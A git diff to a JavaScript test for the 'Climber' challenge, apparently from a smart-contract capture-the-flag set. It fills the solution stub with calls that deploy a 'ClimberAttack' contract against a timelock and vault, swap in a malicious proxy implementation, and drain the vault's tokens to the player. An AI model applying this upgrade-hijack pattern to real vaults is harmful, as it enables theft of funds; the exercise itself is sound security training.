@@ -56,8 +56,13 @@ describe('[Challenge] Climber', function () {
         await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
     });
 
-    it('Execution', async function () {
+    it('Execution Climber', async function () {
         /** CODE YOUR SOLUTION HERE */
+        attackContract = await (await ethers.getContractFactory('ClimberAttack', player)).deploy(timelock.address, vault.address);
+        await attackContract.executeAttack();
+        const maliciousImplementation = await ethers.getContractFactory("MaliciousImplementation");;
+        const proxiedVault = maliciousImplementation.attach(vault.address);
+        await proxiedVault.connect(player).getAllFunds(token.address);
     });
 
     after(async function () {
